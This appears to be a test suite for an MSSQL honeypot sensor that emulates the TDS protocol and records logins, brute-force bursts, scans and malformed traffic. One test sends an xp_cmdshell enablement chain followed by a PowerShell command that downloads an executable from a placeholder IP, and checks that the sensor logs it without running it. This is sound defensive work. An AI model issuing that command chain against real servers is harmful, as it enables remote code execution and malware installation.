from __future__ import annotations

import asyncio
import struct
import time

import pytest
from conftest import HarnessFactory, talk
from tdsclient import Client, batch, login7, packet, prelogin

from mssql_sensor import tds


async def test_prelogin_reply_for_nmap_style_probe(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        raw = await talk(h.port, prelogin())
        assert raw[:8] == bytes([4, 1, 0, 0x2B, 0, 0, 1, 0])
        reply = tds.parse_prelogin(raw[8:])
        assert reply.encryption == tds.ENC_NOT_SUP
        assert reply.version == h.profile.version


async def test_failed_login_error_18456(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        c = await Client.connect(h.port)
        reply = await c.login("admin", "wrong")
        assert reply.errors == [(18456, "Login failed for user 'admin'.")]
        await c.close()
        logins = await h.events("login_attempt")
        assert len(logins) == 1
        d = logins[0].data
        assert d["username"] == "admin" and d["password"] == "wrong" and d["success"] is False
        assert d["hostname"] == "WIN-CLIENT" and d["app_name"] == "test-app"
        assert d["client_library"] == "TDSLIB"
        end = (await h.wait_disconnects(1))[0]
        assert end.data["reason"] == "auth_failed"


async def test_login_and_queries(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        c = await Client.connect(h.port)
        reply = await c.login("sa", "P@ssw0rd")
        assert reply.login_ack and not reply.errors
        r = await c.request(batch("SELECT @@VERSION"))
        assert r.rows and str(r.rows[0][0]).startswith("Microsoft SQL Server 20")
        r = await c.request(batch("select name from sys.databases"))
        assert [row[0] for row in r.rows][:2] == ["master", "tempdb"]
        r = await c.request(batch("select is_srvrolemember('sysadmin'), db_name()"))
        assert r.rows == [[1, "master"]]
        r = await c.request(batch("select * from nosuchtable"))
        assert r.errors[0][0] == 208
        await c.close()
        cmds = await h.events("command")
        assert [e.data["input"] for e in cmds][:2] == [
            "SELECT @@VERSION",
            "select name from sys.databases",
        ]
        assert (await h.events("login_attempt"))[0].data["success"] is True


async def test_xp_cmdshell_recorded_never_executed(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        c = await Client.connect(h.port)
        await c.login("sa", "123456")
        r = await c.request(batch("EXEC xp_cmdshell 'whoami'"))
        assert r.errors and r.errors[0][0] == 15281
        r = await c.request(
            batch(
                "EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE"
            )
        )
        assert not r.errors and len(r.infos) == 2
        r = await c.request(batch("EXEC xp_cmdshell 'whoami'"))
        assert r.rows[0] == ["nt service\\mssqlserver"]
        r = await c.request(
            batch("exec xp_cmdshell 'powershell iwr http://198.51.100.7/x.exe -OutFile x.exe'")
        )
        await c.close()
        cmds = await h.events("command")
        flags = [set(e.data["flags"]) for e in cmds]
        assert any({"xp_cmdshell", "sp_configure"} <= f for f in flags)
        downloads = await h.events("download_attempt")
        assert downloads and downloads[0].data["url"] == "http://198.51.100.7/x.exe"
        end = (await h.wait_disconnects(1))[0]
        assert "xp_cmdshell" in end.data["flags"]
        assert end.data["config_changes"] == {"xp_cmdshell": 1}


async def test_rpc_sp_executesql(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        c = await Client.connect(h.port)
        await c.login("sa", "sa")
        name = struct.pack("<HH", 0xFFFF, 10) + struct.pack("<H", 0)
        sql = "select @@servername".encode("utf-16-le")
        param = (
            b"\x00\x00\xe7" + struct.pack("<H", 8000) + bytes(5) + struct.pack("<H", len(sql)) + sql
        )
        headers = struct.pack("<IIHQI", 22, 18, 2, 0, 1)[:22]
        r = await c.request(packet(tds.T_RPC, headers + name + param))
        assert r.rows == [[h.profile.server_name]]
        await c.close()
        cmd = (await h.events("command"))[0]
        assert cmd.data["rpc"] == "sp_executesql" and cmd.data["input"] == "select @@servername"


async def test_brute_force_burst(make_harness: HarnessFactory) -> None:
    async with make_harness(max_per_ip=50) as h:

        async def attempt(i: int) -> int:
            c = await Client.connect(h.port)
            r = await c.login("sa", f"guess{i}")
            await c.close()
            return len(r.errors)

        results = await asyncio.gather(*(attempt(i) for i in range(30)))
        assert sum(results) == 30
        logins = await h.events("login_attempt")
        assert sorted(e.data["password"] for e in logins) == sorted(f"guess{i}" for i in range(30))


async def test_non_tds_http_is_a_scan(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        data = await talk(h.port, b"GET / HTTP/1.1\r\nHost: x\r\n\r\n")
        assert data == b""
        scans = await h.events("scan")
        assert scans[0].data["kind"] == "non_tds"
        assert scans[0].data["protocol_guess"] == "http"
        assert scans[0].data["hex_preview"].startswith("474554")


@pytest.mark.parametrize(
    "wire",
    [
        bytes([0x12, 0x01, 0x00, 0x04, 0, 0, 1, 0]),  # length below the header size
        bytes([0x10, 0x01, 0xFF, 0xFF, 0, 0, 1, 0]) + bytes(100),  # oversized
        packet(tds.T_PRELOGIN, b"\x00\x00\x0b"),  # truncated option table
        packet(tds.T_LOGIN7, b"\x00" * 50),  # short login
        b"\x16\x03\x01\x00\xa5" + bytes(160),  # TLS hello
        bytes(range(256)),
    ],
)
async def test_malformed_input_closes_cleanly(make_harness: HarnessFactory, wire: bytes) -> None:
    async with make_harness() as h:
        await talk(h.port, wire)
        end = (await h.wait_disconnects(1))[0]
        assert end.data["reason"] in {"protocol_error", "client_closed"}
        assert h.sensor.total == 0 and h.sensor.errors == 0
        assert await h.events("scan")


async def test_tls_style_prelogin_after_prelogin_is_refused(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        c = await Client.connect(h.port)
        c.writer.write(prelogin(tds.ENC_REQ))
        await c.read_message()
        c.writer.write(packet(tds.T_PRELOGIN, b"\x16\x03\x01" + bytes(40)))
        await c.writer.drain()
        assert await asyncio.wait_for(c.reader.read(10), 3) == b""
        end = (await h.wait_disconnects(1))[0]
        assert "tls_attempt" in end.data["flags"] and end.data["client_encryption"] == 3


async def test_idle_connection_times_out(make_harness: HarnessFactory) -> None:
    async with make_harness(first_data_timeout=0.3) as h:
        _, w = await asyncio.open_connection("127.0.0.1", h.port)
        end = (await h.wait_disconnects(1))[0]
        assert end.data["reason"] == "no_data"
        w.close()


async def test_slow_drip_login_is_cut_by_idle_timeout(make_harness: HarnessFactory) -> None:
    async with make_harness(idle_timeout=0.4) as h:
        r, w = await asyncio.open_connection("127.0.0.1", h.port)
        w.write(login7("sa", "x")[:30])
        await w.drain()
        end = (await h.wait_disconnects(1))[0]
        assert end.data["reason"] == "idle"
        w.close()


async def test_per_ip_cap_refuses_extra(make_harness: HarnessFactory) -> None:
    async with make_harness(max_per_ip=3) as h:
        conns = [await asyncio.open_connection("127.0.0.1", h.port) for _ in range(6)]
        await asyncio.sleep(0.3)
        assert h.sensor.total <= 3 and h.sensor.rejected >= 3
        for _, w in conns:
            w.close()


async def test_oversized_message_is_capped_and_survives(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        c = await Client.connect(h.port)
        await c.login("sa", "sa")
        text = "select 1 -- " + "A" * 300_000
        raw = text.encode("utf-16-le")
        hdr = struct.pack("<IIHQI", 22, 18, 2, 0, 1)[:22]
        body = hdr + raw
        room = 4096 - 8
        for i in range(0, len(body), room):
            chunk = body[i : i + room]
            c.writer.write(
                packet(tds.T_SQLBATCH, chunk, eom=i + room >= len(body), pid=(i // room) & 0xFF)
            )
        await c.writer.drain()
        r = await asyncio.wait_for(c.read_message(), 5)
        assert r
        await c.close()
        cmd = (await h.events("command"))[0]
        assert len(cmd.data["input"]) <= 4096 and cmd.data["input_bytes_truncated"] is True


async def test_attention_and_pipelined_batches(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        c = await Client.connect(h.port)
        await c.login("sa", "sa")
        c.writer.write(batch("select 1") + packet(tds.T_ATTENTION, b"") + batch("select 2"))
        await c.writer.drain()
        for _ in range(3):
            assert await c.read_message()
        await c.close()


async def test_event_quota_per_session(make_harness: HarnessFactory) -> None:
    async with make_harness(quota_noisy=5) as h:
        c = await Client.connect(h.port)
        await c.login("sa", "sa")
        for _ in range(30):
            await c.request(batch("select 1"))
        await c.close()
        end = (await h.wait_disconnects(1))[0]
        assert end.data["suppressed_events"]["noisy"] == 25
        assert len(await h.events("command")) == 5


async def test_budget_released_after_close(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        for _ in range(10):
            await talk(h.port, prelogin() + b"\x12\x01\x00\x20" + b"A" * 10, wait=0.05)
        await asyncio.sleep(0.3)
        assert h.sensor.total == 0 and h.sensor.buffered == 0 and not h.sensor.per_ip


async def test_non_reading_client_is_aborted(make_harness: HarnessFactory) -> None:
    async with make_harness(write_timeout=0.5) as h:
        r, w = await asyncio.open_connection("127.0.0.1", h.port)
        w.write(prelogin() + login7("sa", "sa"))
        await w.drain()
        # pipeline many result sets without ever reading
        big = batch("select * from sys.databases") * 400
        for _ in range(60):
            w.write(big)
            try:
                await asyncio.wait_for(w.drain(), 0.2)
            except (TimeoutError, ConnectionError):
                break
        t0 = time.monotonic()
        async with asyncio.timeout(15):
            while h.sensor.total:
                await asyncio.sleep(0.1)
        assert time.monotonic() - t0 < 15
        w.close()


async def test_tds71_client_gets_71_layout(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        c = await Client.connect(h.port)
        reply = await c.login("sa", "sa", version=0x71000001, legacy=True)
        assert reply.login_ack
        r = await c.request(batch("select * from nosuchtable"))
        assert r.errors[0][0] == 208
        r = await c.request(batch("select name from sys.databases"))
        assert len(r.rows) == 6
        await c.close()
        bad = await Client.connect(h.port)
        r = await bad.login("nobody", "x", version=0x71000001, legacy=True)
        assert r.errors == [(18456, "Login failed for user 'nobody'.")]
        await bad.close()
